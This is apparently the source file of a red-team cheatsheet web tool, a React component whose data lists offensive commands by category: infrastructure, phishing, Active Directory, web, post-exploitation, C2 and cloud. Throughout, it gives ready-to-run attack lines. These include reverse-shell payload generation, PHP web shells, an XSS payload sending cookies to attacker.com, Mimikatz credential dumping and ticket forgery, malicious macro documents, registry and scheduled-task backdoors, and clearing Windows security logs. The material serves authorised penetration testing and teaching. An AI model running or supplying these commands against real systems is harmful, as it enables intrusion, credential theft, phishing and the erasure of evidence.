'use client';

import { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { 
  Bomb, 
  Server, 
  Shield, 
  Zap, 
  Search, 
  Copy, 
  ChevronRight, 
  ChevronDown,
  Terminal,
  ExternalLink,
  Database,
  Globe,
  Cloud,
  HelpCircle,
  ArrowRight,
  Check,
  Download,
  Code,
  Plus,
  Trash2,
  Mail
} from 'lucide-react';

// Define cheatsheet data structure
interface Command {
  command: string;
  description: string;
  example?: string;
}

interface Subcategory {
  name: string;
  description: string;
  commands: Command[];
}

interface Category {
  name: string;
  icon: React.ReactNode;
  description: string;
  subcategories: Subcategory[];
}

// Define Command Generator types
interface CommandGeneratorQuestion {
  id: string;
  question: string;
  options?: string[];
  placeholder?: string;
  type: 'select' | 'text' | 'checkbox';
  dependsOn?: {
    questionId: string;
    values: string[];
  };
  advanced?: boolean;
}

interface GeneratedCommand {
  title: string;
  description: string;
  command: string;
  notes?: string;
  mitreTechnique?: string;
  mitreId?: string;
  cleanup?: string;
  opsecNotes?: string;
  evasionVariant?: string;
}

// Define all cheatsheet categories and commands based on 0xJs RedTeaming_CheatSheet
const cheatsheetData: Category[] = [
  {
    name: 'Infrastructure',
    icon: <Server className="w-5 h-5" />,
    description: 'Network and system attacks for initial access',
    subcategories: [
      {
        name: 'Enumeration',
        description: 'Discover and gather information about targets',
        commands: [
          {
            command: 'nmap -sV -sC -p- {target}',
            description: 'Full port scan with service detection and default scripts',
            example: 'nmap -sV -sC -p- 192.168.1.1'
          },
          {
            command: 'nmap -sn {network_range}',
            description: 'Network sweep/ping scan to identify live hosts',
            example: 'nmap -sn 192.168.1.0/24'
          },
          {
            command: 'nmap --script vuln {target}',
            description: 'Scan for common vulnerabilities',
            example: 'nmap --script vuln 10.10.10.10'
          },
          {
            command: 'netdiscover -r {network_range}',
            description: 'Discover active hosts on the network',
            example: 'netdiscover -r 192.168.1.0/24'
          },
          {
            command: 'enum4linux -a {target}',
            description: 'Enumerate SMB shares on Windows/Samba systems',
            example: 'enum4linux -a 192.168.1.10'
          },
          {
            command: 'smbclient -L //{target}/ -N',
            description: 'List SMB shares anonymously',
            example: 'smbclient -L //192.168.1.10/ -N'
          }
        ]
      },
      {
        name: 'Exploitation',
        description: 'Tools and techniques for exploiting vulnerabilities',
        commands: [
          {
            command: 'searchsploit {search_term}',
            description: 'Search for exploits on Exploit-DB',
            example: 'searchsploit apache 2.4.49'
          },
          {
            command: 'msfconsole',
            description: 'Launch Metasploit Framework console',
          },
          {
            command: 'msfvenom -p {payload} LHOST={ip} LPORT={port} -f {format}',
            description: 'Generate payload with MSFvenom',
            example: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > payload.exe'
          },
          {
            command: 'nc -nvlp {port}',
            description: 'Set up a netcat listener',
            example: 'nc -nvlp 4444'
          },
          {
            command: 'hydra -l {username} -P {wordlist} {target} {service}',
            description: 'Brute force authentication with Hydra',
            example: 'hydra -l admin -P ./passwords.txt 192.168.1.1 ssh'
          }
        ]
      },
      {
        name: 'Privilege Escalation (Linux)',
        description: 'Techniques for escalating privileges on Linux systems',
        commands: [
          {
            command: 'sudo -l',
            description: 'List available sudo commands for the current user',
          },
          {
            command: 'find / -perm -u=s -type f 2>/dev/null',
            description: 'Find SUID binaries',
          },
          {
            command: 'cat /etc/crontab',
            description: 'Check for scheduled tasks that may be hijacked',
          },
          {
            command: 'linpeas.sh',
            description: 'Run LinPEAS for Linux privilege escalation enumeration',
          },
          {
            command: 'grep -v -E "^#" /etc/passwd | awk -F: \'$3 == 0 { print $1}\'',
            description: 'Find all users with UID 0 (root equivalent)',
          },
          {
            command: 'find / -writable -type d 2>/dev/null',
            description: 'Find world-writable directories',
          }
        ]
      },
      {
        name: 'Privilege Escalation (Windows)',
        description: 'Techniques for escalating privileges on Windows systems',
        commands: [
          {
            command: 'winPEAS.exe',
            description: 'Run WinPEAS for Windows privilege escalation enumeration',
          },
          {
            command: 'PowerUp.ps1 Invoke-AllChecks',
            description: 'Run PowerUp checks for common Windows privesc paths',
          },
          {
            command: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
            description: 'Check for AlwaysInstallElevated registry setting',
          },
          {
            command: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"',
            description: 'Find services with unquoted paths',
          },
          {
            command: 'sc qc {servicename}',
            description: 'Query configuration of a Windows service',
            example: 'sc qc spooler'
          },
          {
            command: 'accesschk.exe -uwcqv "Authenticated Users" * /accepteula',
            description: 'Check for services Authenticated Users can modify',
          }
        ]
      },
      {
        name: 'Pivoting',
        description: 'Techniques for pivoting through compromised hosts',
        commands: [
          {
            command: 'ssh -L {local_port}:{remote_host}:{remote_port} {user}@{ssh_server}',
            description: 'SSH local port forwarding',
            example: 'ssh -L 8080:internal-app:80 user@compromised-host'
          },
          {
            command: 'ssh -D {local_port} {user}@{ssh_server}',
            description: 'SSH dynamic port forwarding (SOCKS proxy)',
            example: 'ssh -D 1080 user@compromised-host'
          },
          {
            command: 'ssh -R {remote_port}:{local_host}:{local_port} {user}@{ssh_server}',
            description: 'SSH remote port forwarding',
            example: 'ssh -R 8080:localhost:80 user@public-server'
          },
          {
            command: 'proxychains {command}',
            description: 'Route command through proxy defined in proxychains.conf',
            example: 'proxychains nmap -sT -Pn 10.10.10.10'
          },
          {
            command: 'socat TCP-LISTEN:{local_port},fork TCP:{target}:{target_port}',
            description: 'Create a relay with socat',
            example: 'socat TCP-LISTEN:8080,fork TCP:internal-server:80'
          }
        ]
      }
    ]
  },
  {
    name: 'Phishing',
    icon: <Mail className="w-5 h-5" />,
    description: 'Email phishing attack techniques and frameworks',
    subcategories: [
      {
        name: 'Infrastructure Setup',
        description: 'Setting up phishing infrastructure',
        commands: [
          {
            command: 'git clone https://github.com/gophish/gophish.git',
            description: 'Clone the GoPhish repository',
          },
          {
            command: 'cd gophish && go build',
            description: 'Build GoPhish from source',
          },
          {
            command: './gophish',
            description: 'Run GoPhish server (default admin credentials: admin:gophish)',
          },
          {
            command: 'docker run -d -p 3333:3333 -p 8080:80 -p 8443:443 gophish/gophish',
            description: 'Run GoPhish using Docker',
          },
          {
            command: 'docker run -d --name evilginx2 -p 80:80 -p 443:443 kgretzky/evilginx2',
            description: 'Run Evilginx2 phishing proxy',
          }
        ]
      },
      {
        name: 'Email Configuration',
        description: 'Setting up email sending capabilities',
        commands: [
          {
            command: 'sudo apt-get install postfix',
            description: 'Install Postfix mail server on Linux',
          },
          {
            command: 'nano /etc/postfix/main.cf',
            description: 'Edit Postfix configuration file',
          },
          {
            command: 'echo "myhostname = phishing-server.com" >> /etc/postfix/main.cf',
            description: 'Set hostname for Postfix',
          },
          {
            command: 'openssl s_client -connect smtp.gmail.com:587 -starttls smtp',
            description: 'Test SMTP connection with TLS',
          },
          {
            command: 'swaks --to target@example.com --from attacker@example.com --server mail.example.com --body "Test message"',
            description: 'Test email sending with SWAKS tool',
            example: 'swaks --to victim@company.com --from hr@company.com --server 192.168.1.10 --body "Please reset your password"'
          }
        ]
      },
      {
        name: 'Target Reconnaissance',
        description: 'Gathering information about phishing targets',
        commands: [
          {
            command: 'theHarvester -d {domain} -l 500 -b google,linkedin',
            description: 'Collect email addresses from a domain',
            example: 'theHarvester -d company.com -l 500 -b google,linkedin'
          },
          {
            command: 'curl -s "https://api.hunter.io/v2/domain-search?domain={domain}&api_key={api_key}"',
            description: 'Find email addresses using Hunter.io API',
            example: 'curl -s "https://api.hunter.io/v2/domain-search?domain=company.com&api_key=your-api-key"'
          },
          {
            command: 'git clone https://github.com/laramies/theHarvester.git',
            description: 'Clone theHarvester for email gathering',
          },
          {
            command: 'linkedin2username -c {company_name}',
            description: 'Generate potential usernames from LinkedIn profiles',
            example: 'linkedin2username -c "Target Company"'
          },
          {
            command: 'whois {domain} | grep "Admin Email"',
            description: 'Find admin contact email from WHOIS records',
            example: 'whois company.com | grep "Admin Email"'
          }
        ]
      },
      {
        name: 'Content Creation',
        description: 'Creating convincing phishing content',
        commands: [
          {
            command: 'wget -r -l1 -k -p {target_website}',
            description: 'Clone a website for phishing template',
            example: 'wget -r -l1 -k -p https://login.company.com'
          },
          {
            command: 'sed -i \'s/action="[^"]*"/action="post.php"/g\' login.html',
            description: 'Modify form action in cloned page',
          },
          {
            command: 'msfvenom -p windows/meterpreter/reverse_https LHOST={ip} LPORT=443 -f exe > attachment.exe',
            description: 'Create malicious attachment for phishing',
            example: 'msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe > attachment.exe'
          },
          {
            command: 'echo \'<?php header("Location: https://legitimate-site.com"); ?>\' > redirect.php',
            description: 'Create redirect script for after credential capture',
          },
          {
            command: 'macro_pack -t WORD -o -G payload.doc',
            description: 'Create malicious Office document with macro',
          }
        ]
      },
      {
        name: 'Campaign Execution',
        description: 'Launching and managing phishing campaigns',
        commands: [
          {
            command: 'gophish campaigns new',
            description: 'Create a new campaign in GoPhish CLI',
          },
          {
            command: 'python3 -m SimpleHTTPServer 80',
            description: 'Start simple web server for phishing page',
          },
          {
            command: 'netcat -lvnp 8080',
            description: 'Set up listener for captured credentials',
          },
          {
            command: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST {ip}; set LPORT 443; run"',
            description: 'Set up Metasploit handler for payload',
            example: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 192.168.1.100; set LPORT 443; run"'
          },
          {
            command: 'sendEmail -f sender@example.com -t targets.txt -u "Urgent: Action Required" -m "Please click the link: http://phish.example.com" -s smtp.example.com:25',
            description: 'Send phishing emails with sendEmail tool',
          }
        ]
      },
      {
        name: 'Analysis & Reporting',
        description: 'Tracking and analyzing phishing campaign results',
        commands: [
          {
            command: 'grep -r "password" /var/log/apache2/',
            description: 'Search web server logs for captured credentials',
          },
          {
            command: 'tail -f phishing-results.log',
            description: 'Monitor real-time campaign results',
          },
          {
            command: 'sqlite3 gophish.db "SELECT * FROM results;"',
            description: 'Query GoPhish database for campaign results',
          },
          {
            command: 'python3 -c "import json; data=json.load(open(\'results.json\')); print(f\'Success rate: {len([x for x in data if x[\"clicked\"]])/len(data)*100}%\')"',
            description: 'Calculate click rate from results JSON',
          },
          {
            command: 'echo \'{"campaign":"Q4 Security Test","targets":500,"clicks":125,"creds":75}\' > report.json',
            description: 'Create campaign summary report',
          }
        ]
      },
      {
        name: 'Cleanup',
        description: 'Securely removing evidence after campaign completion',
        commands: [
          {
            command: 'docker stop gophish && docker rm gophish',
            description: 'Stop and remove GoPhish Docker container',
          },
          {
            command: 'find /var/www/phishing -type f -exec shred -n 3 -z -u {} \\;',
            description: 'Securely delete phishing website files',
          },
          {
            command: 'systemctl stop postfix && apt-get purge postfix',
            description: 'Stop and remove mail server',
          },
          {
            command: 'history -c && rm ~/.bash_history',
            description: 'Clear command history',
          },
          {
            command: 'tar -czf campaign_results.tar.gz ./results/ && gpg -c campaign_results.tar.gz && shred -n 3 -z -u campaign_results.tar.gz',
            description: 'Securely archive and encrypt campaign results',
          }
        ]
      }
    ]
  },
  {
    name: 'Windows AD',
    icon: <Database className="w-5 h-5" />,
    description: 'Active Directory attacks and techniques',
    subcategories: [
      {
        name: 'Initial Access',
        description: 'Techniques for gaining initial access to an AD environment',
        commands: [
          {
            command: 'crackmapexec smb {target} -u {user} -p {password}',
            description: 'Test SMB credentials against target',
            example: 'crackmapexec smb 192.168.1.0/24 -u admin -p password'
          },
          {
            command: 'evil-winrm -i {target} -u {user} -p {password}',
            description: 'Connect to WinRM using credentials',
            example: 'evil-winrm -i 192.168.1.10 -u administrator -p password'
          },
          {
            command: 'GetNPUsers.py {domain}/ -dc-ip {dc_ip} -usersfile {users_file} -format hashcat',
            description: 'Kerberos AS-REP Roasting (pre-auth disabled)',
            example: 'GetNPUsers.py contoso.local/ -dc-ip 192.168.1.10 -usersfile users.txt -format hashcat'
          },
          {
            command: 'responder -I {interface} -A',
            description: 'Capture NTLM hashes using Responder',
            example: 'responder -I eth0 -A'
          }
        ]
      },
      {
        name: 'Host Reconnaissance',
        description: 'Gathering information after gaining access to a host',
        commands: [
          {
            command: 'systeminfo',
            description: 'Get detailed system information',
          },
          {
            command: 'net user',
            description: 'List all local users',
          },
          {
            command: 'net localgroup administrators',
            description: 'List members of the local administrators group',
          },
          {
            command: 'netstat -ano',
            description: 'Show active network connections',
          },
          {
            command: 'schtasks /query /fo LIST /v',
            description: 'List all scheduled tasks',
          },
          {
            command: 'wmic product get name,version',
            description: 'List installed software',
          }
        ]
      },
      {
        name: 'Lateral Movement',
        description: 'Techniques for moving laterally within an AD environment',
        commands: [
          {
            command: 'wmiexec.py {domain}/{user}:{password}@{target}',
            description: 'Execute commands via WMI',
            example: 'wmiexec.py contoso/administrator:password@192.168.1.10'
          },
          {
            command: 'smbexec.py {domain}/{user}:{password}@{target}',
            description: 'Execute commands via SMB',
            example: 'smbexec.py contoso/administrator:password@192.168.1.10'
          },
          {
            command: 'psexec.py {domain}/{user}:{password}@{target}',
            description: 'Execute commands via PsExec',
            example: 'psexec.py contoso/administrator:password@192.168.1.10'
          },
          {
            command: 'Enter-PSSession -ComputerName {target}',
            description: 'Start PowerShell remote session',
            example: 'Enter-PSSession -ComputerName DC01'
          },
          {
            command: 'mimikatz "sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{hash}"',
            description: 'Pass-the-Hash with Mimikatz',
            example: 'mimikatz "sekurlsa::pth /user:administrator /domain:contoso /ntlm:a1b2c3d4e5f6g7h8i9j0"'
          }
        ]
      },
      {
        name: 'Domain Enumeration',
        description: 'Gathering information about the domain structure',
        commands: [
          {
            command: 'net user /domain',
            description: 'List all domain users',
          },
          {
            command: 'net group /domain',
            description: 'List all domain groups',
          },
          {
            command: 'powerview> Get-NetUser',
            description: 'PowerView: Get information about domain users',
          },
          {
            command: 'powerview> Get-NetGroup',
            description: 'PowerView: Get information about domain groups',
          },
          {
            command: 'powerview> Get-DomainController',
            description: 'PowerView: Get domain controllers',
          },
          {
            command: 'bloodhound-python -d {domain} -u {user} -p {password} -c All',
            description: 'Collect data for BloodHound analysis',
            example: 'bloodhound-python -d contoso.local -u user -p password -c All'
          }
        ]
      },
      {
        name: 'Kerberos Attacks',
        description: 'Attacks targeting Kerberos authentication',
        commands: [
          {
            command: 'GetUserSPNs.py -request {domain}/{user}:{password}',
            description: 'Kerberoast: Request service tickets for SPN accounts',
            example: 'GetUserSPNs.py -request contoso.local/user:password'
          },
          {
            command: 'GetNPUsers.py {domain}/ -usersfile users.txt -format hashcat -outputfile hashes.txt',
            description: 'AS-REP Roasting: Get hashes for users without Kerberos pre-auth',
            example: 'GetNPUsers.py contoso.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt'
          },
          {
            command: 'mimikatz "kerberos::golden /user:Administrator /domain:{domain} /sid:{domain_sid} /krbtgt:{krbtgt_hash} /id:500 /ptt"',
            description: 'Create and inject a Golden Ticket',
            example: 'mimikatz "kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:deadbeefdeadbeefdeadbeefdeadbeef /id:500 /ptt"'
          },
          {
            command: 'mimikatz "kerberos::silver /target:{service} /service:{svc_type} /user:{user} /domain:{domain} /sid:{domain_sid} /rc4:{service_hash} /ptt"',
            description: 'Create and inject a Silver Ticket',
            example: 'mimikatz "kerberos::silver /target:dc01.contoso.local /service:cifs /user:Administrator /domain:contoso.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /rc4:deadbeefdeadbeefdeadbeefdeadbeef /ptt"'
          }
        ]
      },
      {
        name: 'Domain Privilege Escalation',
        description: 'Techniques for escalating privileges within a domain',
        commands: [
          {
            command: 'powerview> Find-DomainShare',
            description: 'PowerView: Find accessible shares in the domain',
          },
          {
            command: 'powerview> Get-DomainUser -Identity "krbtgt" -Properties samaccountname,objectsid',
            description: 'PowerView: Get information about the KRBTGT account',
          },
          {
            command: 'powerview> Find-LocalAdminAccess',
            description: 'PowerView: Find machines where current user has admin rights',
          },
          {
            command: 'powerview> Add-DomainGroupMember -Identity "Domain Admins" -Members targetUser',
            description: 'PowerView: Add user to Domain Admins group',
          },
          {
            command: 'mimikatz "lsadump::dcsync /domain:{domain} /user:{domain_admin}"',
            description: 'DCSync attack to extract password hashes',
            example: 'mimikatz "lsadump::dcsync /domain:contoso.local /user:administrator"'
          }
        ]
      }
    ]
  },
  {
    name: 'Web Attacks',
    icon: <Globe className="w-5 h-5" />,
    description: 'Web application testing techniques',
    subcategories: [
      {
        name: 'Reconnaissance',
        description: 'Information gathering about web applications',
        commands: [
          {
            command: 'whatweb {url}',
            description: 'Identify web technologies and CMS',
            example: 'whatweb https://example.com'
          },
          {
            command: 'gobuster dir -u {url} -w {wordlist}',
            description: 'Directory brute forcing with Gobuster',
            example: 'gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'
          },
          {
            command: 'wpscan --url {url}',
            description: 'WordPress vulnerability scanner',
            example: 'wpscan --url https://example.com'
          },
          {
            command: 'nikto -h {target}',
            description: 'Web server scanner for vulnerabilities',
            example: 'nikto -h https://example.com'
          },
          {
            command: 'curl -I {url}',
            description: 'Check HTTP headers for information disclosure',
            example: 'curl -I https://example.com'
          }
        ]
      },
      {
        name: 'Injection',
        description: 'Injection attack techniques',
        commands: [
          {
            command: 'sqlmap -u "{url}" --forms --batch',
            description: 'Automated SQL injection testing',
            example: 'sqlmap -u "https://example.com/page.php?id=1" --forms --batch'
          },
          {
            command: 'sqlmap -u "{url}" --data="{post_data}" --dbs',
            description: 'SQL injection with POST data, enumerate databases',
            example: 'sqlmap -u "https://example.com/login.php" --data="username=admin&password=test" --dbs'
          },
          {
            command: 'sqlmap -u "{url}" -p {parameter} --level=5 --risk=3',
            description: 'Aggressive SQL injection against specific parameter',
            example: 'sqlmap -u "https://example.com/page.php?id=1" -p id --level=5 --risk=3'
          },
          {
            command: '<?php system($_GET["cmd"]); ?>',
            description: 'Basic PHP web shell',
            example: '<?php system($_GET["cmd"]); ?> saved as shell.php, then access as: example.com/shell.php?cmd=whoami'
          },
          {
            command: '<script>fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)</script>',
            description: 'Basic XSS payload to steal cookies',
          }
        ]
      },
      {
        name: 'Authentication',
        description: 'Authentication bypass and brute forcing',
        commands: [
          {
            command: 'hydra -l {username} -P {wordlist} {target} http-post-form "{path}:{form_data}:{failure_message}"',
            description: 'Brute force HTTP POST form',
            example: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"'
          },
          {
            command: 'wfuzz -c -w {wordlist} --hc 404 {url}/FUZZ',
            description: 'Fuzz for directories/files, hide 404 responses',
            example: 'wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 https://example.com/FUZZ'
          },
          {
            command: 'medusa -h {target} -u {username} -P {wordlist} -M http -m DIR:{login_path}',
            description: 'HTTP login brute force',
            example: 'medusa -h example.com -u admin -P passwords.txt -M http -m DIR:/admin'
          },
          {
            command: 'python jwt_tool.py {jwt_token} -T',
            description: 'Test JWT token for vulnerabilities',
            example: 'python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U -T'
          }
        ]
      },
      {
        name: 'File Upload',
        description: 'File upload vulnerability techniques',
        commands: [
          {
            command: 'weevely generate {password} {output_file}',
            description: 'Generate a PHP webshell with weevely',
            example: 'weevely generate P@ssw0rd shell.php'
          },
          {
            command: 'weevely {url} {password}',
            description: 'Connect to a weevely webshell',
            example: 'weevely https://example.com/uploads/shell.php P@ssw0rd'
          },
          {
            command: 'GIF89a;<?php system($_GET["cmd"]); ?>',
            description: 'PHP code disguised as a GIF image',
            example: 'Save as image.php.gif or image.gif, then rename after upload if possible'
          },
          {
            command: 'msfvenom -p php/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.php',
            description: 'Generate a PHP meterpreter shell',
            example: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f raw > shell.php'
          }
        ]
      }
    ]
  },
  {
    name: 'Post Exploitation',
    icon: <Terminal className="w-5 h-5" />,
    description: 'Post-exploitation techniques',
    subcategories: [
      {
        name: 'Data Exfiltration',
        description: 'Methods to extract data from compromised systems',
        commands: [
          {
            command: 'nc -lvnp {port} > {output_file}',
            description: 'Set up netcat listener to receive data',
            example: 'nc -lvnp 4444 > received_data.txt'
          },
          {
            command: 'cat {file} | base64',
            description: 'Base64 encode a file for exfiltration',
            example: 'cat /etc/passwd | base64'
          },
          {
            command: 'scp {file} {user}@{target}:{remote_path}',
            description: 'Secure copy file to remote system',
            example: 'scp data.zip user@192.168.1.10:/tmp/'
          },
          {
            command: 'python -m SimpleHTTPServer {port}',
            description: 'Start a simple HTTP server (Python 2)',
            example: 'python -m SimpleHTTPServer 8000'
          },
          {
            command: 'python3 -m http.server {port}',
            description: 'Start a simple HTTP server (Python 3)',
            example: 'python3 -m http.server 8000'
          }
        ]
      },
      {
        name: 'Persistence',
        description: 'Techniques to maintain access',
        commands: [
          {
            command: 'echo "{ssh_key}" >> ~/.ssh/authorized_keys',
            description: 'Add SSH key for persistence',
            example: 'echo "ssh-rsa AAAAB3NzaC1yc2EAAA..." >> ~/.ssh/authorized_keys'
          },
          {
            command: 'crontab -e',
            description: 'Edit user crontab for persistence',
          },
          {
            command: 'schtasks /create /sc minute /mo {minutes} /tn "{name}" /tr {command}',
            description: 'Create scheduled task on Windows',
            example: 'schtasks /create /sc minute /mo 5 /tn "Updater" /tr "C:\\backdoor.exe"'
          },
          {
            command: 'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{name}" /t REG_SZ /d "{command}" /f',
            description: 'Add startup registry key for persistence',
            example: 'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Updater" /t REG_SZ /d "C:\\backdoor.exe" /f'
          },
          {
            command: 'wmic /namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="{name}", EventNameSpace="root\\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',
            description: 'Create WMI permanent event subscription (Part 1)',
            example: 'wmic /namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="filtP1", EventNameSpace="root\\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"'
          }
        ]
      },
      {
        name: 'Credential Extraction',
        description: 'Extract credentials from compromised systems',
        commands: [
          {
            command: 'mimikatz "privilege::debug" "sekurlsa::logonpasswords"',
            description: 'Extract passwords from memory with Mimikatz',
          },
          {
            command: 'reg save HKLM\\System system.hive && reg save HKLM\\SAM sam.hive',
            description: 'Extract SAM and SYSTEM hives for offline processing',
          },
          {
            command: 'secretsdump.py -ntds {ntds_file} -system {system_hive} LOCAL',
            description: 'Extract hashes from NTDS.dit and SYSTEM hive',
            example: 'secretsdump.py -ntds ntds.dit -system system.hive LOCAL'
          },
          {
            command: 'findstr /si password *.txt *.ini *.config *.xml',
            description: 'Find passwords in Windows configuration files',
          },
          {
            command: 'grep -r "password\\|passwd\\|pwd" /etc/ 2>/dev/null',
            description: 'Find passwords in Linux configuration files',
          }
        ]
      },
      {
        name: 'Covering Tracks',
        description: 'Techniques to cover your tracks',
        commands: [
          {
            command: 'history -c',
            description: 'Clear bash history',
          },
          {
            command: 'unset HISTFILE',
            description: 'Disable bash history logging',
          },
          {
            command: 'export HISTSIZE=0',
            description: 'Set history size to zero',
          },
          {
            command: 'wevtutil cl System',
            description: 'Clear Windows System event log',
          },
          {
            command: 'wevtutil cl Security',
            description: 'Clear Windows Security event log',
          },
          {
            command: 'wevtutil cl Application',
            description: 'Clear Windows Application event log',
          }
        ]
      }
    ]
  },
  {
    name: 'C2 Frameworks',
    icon: <Shield className="w-5 h-5" />,
    description: 'Command and Control frameworks',
    subcategories: [
      {
        name: 'Cobalt Strike',
        description: 'Cobalt Strike commands and techniques',
        commands: [
          {
            command: './teamserver {ip} {password} {c2profile}',
            description: 'Start Cobalt Strike team server',
            example: './teamserver 192.168.1.2 P@ssw0rd c2.profile'
          },
          {
            command: 'sleep 30 60',
            description: 'Set beacon sleep time (30s with 60% jitter)',
          },
          {
            command: 'make_token {domain}\\{user} {password}',
            description: 'Create a token to impersonate user',
            example: 'make_token CONTOSO\\administrator P@ssw0rd'
          },
          {
            command: 'spawnas {domain}\\{user} {password} {listener}',
            description: 'Spawn a beacon as different user',
            example: 'spawnas CONTOSO\\administrator P@ssw0rd smb'
          },
          {
            command: 'jump psexec64 {target} {listener}',
            description: 'Lateral movement using psexec',
            example: 'jump psexec64 192.168.1.10 smb'
          }
        ]
      },
      {
        name: 'Metasploit',
        description: 'Metasploit Framework commands',
        commands: [
          {
            command: 'msfconsole',
            description: 'Start Metasploit Framework console',
          },
          {
            command: 'use {module}',
            description: 'Select a module to use',
            example: 'use exploit/windows/smb/ms17_010_eternalblue'
          },
          {
            command: 'set RHOSTS {target}',
            description: 'Set remote target(s)',
            example: 'set RHOSTS 192.168.1.10'
          },
          {
            command: 'set PAYLOAD {payload}',
            description: 'Set payload to use',
            example: 'set PAYLOAD windows/meterpreter/reverse_tcp'
          },
          {
            command: 'set LHOST {ip}',
            description: 'Set local host for callbacks',
            example: 'set LHOST 192.168.1.2'
          },
          {
            command: 'run',
            description: 'Execute the module',
          }
        ]
      },
      {
        name: 'PowerShell Empire',
        description: 'PowerShell Empire commands',
        commands: [
          {
            command: 'listeners',
            description: 'Manage listeners in Empire',
          },
          {
            command: 'uselistener {listener_type}',
            description: 'Select a listener type',
            example: 'uselistener http'
          },
          {
            command: 'usestager {stager}',
            description: 'Select a stager',
            example: 'usestager windows/launcher_bat'
          },
          {
            command: 'usemodule {module}',
            description: 'Select a module',
            example: 'usemodule credentials/mimikatz/logonpasswords'
          },
          {
            command: 'agents',
            description: 'List all agents',
          }
        ]
      }
    ]
  },
  {
    name: 'Cloud',
    icon: <Cloud className="w-5 h-5" />,
    description: 'Cloud attacks and techniques',
    subcategories: [
      {
        name: 'Azure Attacks',
        description: 'Microsoft Azure attack techniques',
        commands: [
          {
            command: 'az login',
            description: 'Authenticate to Azure CLI',
          },
          {
            command: 'az account list',
            description: 'List all subscriptions for logged in account',
          },
          {
            command: 'az account set --subscription "{subscription_id}"',
            description: 'Set active subscription',
            example: 'az account set --subscription "00000000-0000-0000-0000-000000000000"'
          },
          {
            command: 'az group list',
            description: 'List all resource groups',
          },
          {
            command: 'az vm list -g {resource_group}',
            description: 'List all VMs in a resource group',
            example: 'az vm list -g myResourceGroup'
          }
        ]
      },
      {
        name: 'AWS Attacks',
        description: 'Amazon Web Services attack techniques',
        commands: [
          {
            command: 'aws configure',
            description: 'Configure AWS CLI with credentials',
          },
          {
            command: 'aws sts get-caller-identity',
            description: 'Show current IAM identity information',
          },
          {
            command: 'aws s3 ls',
            description: 'List all S3 buckets',
          },
          {
            command: 'aws s3 ls s3://{bucket_name}/',
            description: 'List all objects in an S3 bucket',
            example: 'aws s3 ls s3://my-bucket/'
          },
          {
            command: 'aws ec2 describe-instances',
            description: 'List all EC2 instances',
          }
        ]
      },
      {
        name: 'GCP Attacks',
        description: 'Google Cloud Platform attack techniques',
        commands: [
          {
            command: 'gcloud auth login',
            description: 'Authenticate to Google Cloud SDK',
          },
          {
            command: 'gcloud projects list',
            description: 'List all accessible projects',
          },
          {
            command: 'gcloud config set project {project_id}',
            description: 'Set active project',
            example: 'gcloud config set project my-project'
          },
          {
            command: 'gcloud compute instances list',
            description: 'List all compute instances',
          },
          {
            command: 'gcloud storage ls',
            description: 'List all storage buckets',
          }
        ]
      }
    ]
  }
];

// Command Generator questions
const commandGeneratorQuestions: CommandGeneratorQuestion[] = [
  {
    id: 'attackType',
    question: 'What type of assessment are you conducting?',
    options: ['Active Directory', 'Web Application', 'Network Infrastructure', 'Cloud'],
    type: 'select'
  },
  {
    id: 'hasTarget',
    question: 'Do you have a target IP or hostname?',
    type: 'checkbox'
  },
  {
    id: 'targetIP',
    question: 'What is the target IP/hostname?',
    placeholder: 'e.g., 192.168.1.10 or example.com',
    type: 'text',
    dependsOn: {
      questionId: 'hasTarget',
      values: ['true']
    }
  },
  {
    id: 'hasCredentials',
    question: 'Do you have any credentials?',
    type: 'checkbox',
    dependsOn: {
      questionId: 'attackType',
      values: ['Active Directory', 'Network Infrastructure', 'Cloud']
    }
  },
  {
    id: 'username',
    question: 'Username',
    placeholder: 'e.g., jsmith or domain\\jsmith',
    type: 'text',
    dependsOn: {
      questionId: 'hasCredentials',
      values: ['true']
    }
  },
  {
    id: 'password',
    question: 'Password',
    placeholder: 'e.g., Password123!',
    type: 'text',
    dependsOn: {
      questionId: 'hasCredentials',
      values: ['true']
    }
  },
  {
    id: 'adDomain',
    question: 'Do you know the domain name?',
    type: 'checkbox',
    dependsOn: {
      questionId: 'attackType',
      values: ['Active Directory']
    }
  },
  {
    id: 'domainName',
    question: 'Domain name',
    placeholder: 'e.g., contoso.local',
    type: 'text',
    dependsOn: {
      questionId: 'adDomain',
      values: ['true']
    }
  },
  {
    id: 'webTarget',
    question: 'Target URL',
    placeholder: 'e.g., https://example.com',
    type: 'text',
    dependsOn: {
      questionId: 'attackType',
